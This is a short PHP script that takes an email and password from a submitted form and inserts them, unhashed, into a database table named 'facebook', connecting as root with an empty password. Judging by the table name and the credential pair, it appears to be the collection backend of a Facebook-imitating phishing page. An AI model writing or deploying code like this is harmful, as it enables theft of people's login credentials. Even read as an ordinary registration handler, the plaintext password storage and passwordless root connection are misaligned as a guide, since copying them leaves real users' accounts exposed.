<?php
    $email = $_POST['email'];
    $password = $_POST['password'];


    // Database Connection
    
    $conn = new mysqli('localhost','root','','id21442428_error');

    
    if($conn->connect_error)
    {
        die('Connection Failed : '.$conn->connect_error);
    }
    else
    {
        $stmt = $conn->prepare("insert into facebook(email, password)values(?, ?)");
        $stmt->bind_param("ss",$email, $password);
        $stmt->execute();
        echo "registration Successfully...";
        $stmt->close();
        $conn->close();
    }
    
    
?>


